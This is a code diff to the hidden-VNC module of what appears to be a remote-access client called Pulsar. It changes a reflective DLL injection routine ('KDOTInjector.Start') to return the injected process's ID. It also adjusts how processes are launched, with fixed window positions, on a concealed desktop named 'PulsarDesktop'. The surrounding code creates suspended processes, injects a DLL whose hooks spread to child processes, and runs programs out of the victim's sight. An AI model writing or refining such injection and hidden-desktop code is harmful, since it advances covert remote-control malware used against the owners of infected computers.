@@ -17,26 +17,27 @@ namespace Pulsar.Client.Helper.HVNC
         /// <param name="exePath">Path to the executable to start and inject into</param>
         /// <param name="searchPattern">Pattern to search for in the target process</param>
         /// <param name="replacementPath">Replacement path for the search pattern</param>
-        public static void Start(byte[] dllBytes, string exePath, string searchPattern, string replacementPath)
+        /// <returns>Process ID of the started process, or 0 if failed</returns>
+        public static int Start(byte[] dllBytes, string exePath, string searchPattern, string replacementPath)
         {
             try
             {
                 if (dllBytes == null || dllBytes.Length == 0)
                 {
                     Debug.WriteLine("[-] Invalid DLL bytes provided");
-                    return;
+                    return 0;
                 }
 
                 if (string.IsNullOrWhiteSpace(exePath))
                 {
                     Debug.WriteLine("[-] No target executable specified");
-                    return;
+                    return 0;
                 }
 
                 if (string.IsNullOrWhiteSpace(searchPattern) || string.IsNullOrWhiteSpace(replacementPath))
                 {
                     Debug.WriteLine("[-] Search pattern and replacement path are required");
-                    return;
+                    return 0;
                 }
 
                 Debug.WriteLine($"[*] Starting reflective DLL injection");
@@ -51,7 +52,7 @@ namespace Pulsar.Client.Helper.HVNC
                 if (process == null || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
                 {
                     Debug.WriteLine("[-] Failed to create suspended process");
-                    return;
+                    return 0;
                 }
 
                 int processId = process.Id;
@@ -75,7 +76,7 @@ namespace Pulsar.Client.Helper.HVNC
                         {
                             process.Kill();
                         }
-                        return;
+                        return 0;
                     }
                 }
                 finally
@@ -88,10 +89,12 @@ namespace Pulsar.Client.Helper.HVNC
                 Injector.CloseHandle(hThread);
 
                 Debug.WriteLine("[+] Process running. DLL hooks will propagate to child processes.");
+                return processId;
             }
             catch (Exception ex)
             {
                 Debug.WriteLine($"[-] Exception in KDOTInjector.Start: {ex.Message}");
+                return 0;
             }
         }
     }
@@ -154,6 +157,7 @@ namespace Pulsar.Client.Helper.HVNC
 
         private const uint CREATE_SUSPENDED = 0x00000004;
         private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
+        private const int STARTF_USEPOSITION = 0x00000004;
 
         public static Process StartProcessNormal(string exePath)
         {
@@ -226,9 +230,13 @@ namespace Pulsar.Client.Helper.HVNC
                 STARTUPINFO si = new STARTUPINFO();
                 si.cb = Marshal.SizeOf(si);
                 si.lpDesktop = "PulsarDesktop";
+
+                si.dwX = 0;
+                si.dwY = 0;
+                si.dwFlags = STARTF_USEPOSITION;
                 PROCESS_INFORMATION pi;
 
-                string commandLine = $"\"{exePath}\"";
+                string commandLine = $"\"{exePath}\" --window-position=0,0";
 
                 envBlock = CreateEnvironmentBlock(searchPath, replacePath);
 
